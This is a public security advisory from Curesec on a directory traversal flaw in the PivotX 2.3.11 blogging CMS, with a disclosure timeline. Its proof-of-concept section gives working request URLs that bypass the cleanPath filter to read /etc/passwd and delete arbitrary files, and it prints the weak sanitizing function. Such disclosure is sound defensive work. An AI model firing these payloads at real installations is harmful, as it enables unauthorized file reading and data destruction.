@@ -1,0 +1,78 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:    PivotX 2.3.11
+Fixed in:            not fixed
+Fixed Version Link:  n/a
+Vendor Website:      http://pivotx.net/
+Vulnerability Type:  Directory Traversal
+Remote Exploitable:  Yes
+Reported to vendor:  01/20/2016
+Disclosed to public: 03/15/2016
+Release mode:        Full Disclosure
+CVE:                 n/a
+Credits              Tim Coen of Curesec GmbH
+
+2. Overview
+
+PivotX is a CMS for blogging written in PHP. In version 2.3.11, it is
+vulnerable to Directory Traversal, allowing authenticated users to read and
+delete files outside of the PivotX directory.
+
+3. Details
+
+Description
+
+CVSS: Medium 4.0 AV:N/AC:L/Au:S/C:P/I:N/A:N
+
+The function cleanPath which is responsible for sanitizing path names can be
+bypassed by an attacker, leading to directory traversal in multiple places.
+
+Proof of Concept
+
+Admins and Superadmins can read any file:
+
+http://localhost/pivotx_latest/pivotx/ajaxhelper.php?function=view&basedir=
+L3Zhci93d3cvcGl2b3R4X2xhdGVzdC9CYXNlZGlyLwo=&file=../.....//...//.....//.../
+/.....//...//.....//...//.....//...//.....//...//etc/passwd
+
+Advanced users, Admins and Superadmins can delete any file, possibly leading to
+DOS:
+
+http://localhost/pivotx_latest/pivotx/index.php?page=media&del=.....//.../
+/.....//...//.....//...//.....//...//.....//...//.....//...//important/
+important.file&pivotxsession=ovyyn4ob2jc5ym92
+
+Code
+
+lib.php
+function cleanPath($path) {
+    $path = str_replace('../', '', $path);
+    $path = str_replace('..\\', '', $path);
+    $path = str_replace('..'.DIRECTORY_SEPARATOR, '', $path);
+    return $path;
+}
+
+4. Solution
+
+This issue was not fixed by the vendor.
+
+5. Report Timeline
+
+01/20/2016 Informed Vendor about Issue
+01/29/2016 Vendor replies, PivotX is not maintained anymore
+03/15/2016 Disclosed to public
+
+
+Blog Reference:
+https://blog.curesec.com/article/blog/PivotX-2311-Directory-Traversal-154.html
+ 
+--
+blog:  https://blog.curesec.com
+tweet: https://twitter.com/curesec
+
+Curesec GmbH
+Curesec Research Team
+Romain-Rolland-Str 14-24
+13089 Berlin, Germany
